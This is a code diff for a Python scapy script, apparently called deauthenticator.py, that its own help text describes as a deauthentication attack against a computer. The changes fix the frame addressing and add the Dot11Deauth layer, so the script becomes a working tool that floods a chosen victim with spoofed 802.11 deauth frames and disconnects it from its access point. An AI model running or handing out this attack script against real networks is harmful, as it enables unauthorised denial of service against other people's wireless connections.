@@ -1,25 +1,20 @@
 #!/usr/bin/env python3
 from scapy.all import (
-                       RadioTap, # Adds additional metadata to an 802.11 frame
-                       Dot11,    # For creating 802.11 frame
-                       sendp     # for sending packets
+                       RadioTap,    # Adds additional metadata to an 802.11 frame
+                       Dot11,       # For creating 802.11 frame
+                       Dot11Deauth, # For creating deauth frame
+                       sendp        # for sending packets
                       )
 from argparse import ArgumentParser as AP
 from sys import exit
-
 def deauth(iface: str, count: int, bssid: str, target_mac: str):
     """
-    - type=0 specifies that the frame we will be sending is 
-      a management frame
-    - subtype=12 specifies the type of management frame we want
-      to send, which is a deauthentication frame , denoted by the number 12
     - addr1=target_mac specifies that this packet will go to the victim's computer
-    - addr2=bssid specifies the MAC address of the source computer
-    - addr3 specifies the MAC address of the access point which is equal to
-      the source MAC address
+    - addr2=bssid specifies the MAC address of the AP 
+    - addr3=bssid is the same as addr2
     """
-    dot11 = Dot11(type=0, subtype=12, addr1=bssid, addr2=target_mac, addr3=bssid)
-    frame = RadioTap()/dot11
+    dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
+    frame = RadioTap()/dot11/Dot11Deauth()
     sendp(frame, iface=iface, count=count, inter=0.100)
 if __name__ == "__main__":
     parser = AP(description="Perform Deauthentication attack against a computer")
@@ -32,5 +27,5 @@ if __name__ == "__main__":
         or not args.bssid or not args.target_mac):
         print("[-] Please specify all program arguments... run `sudo python3 deauthenticator.py -h` for help")
         exit(1)
-    deauth(args.interface, args.count, args.bssid, args.target_mac)
+    deauth(args.interface, int(args.count), args.bssid, args.target_mac)
     
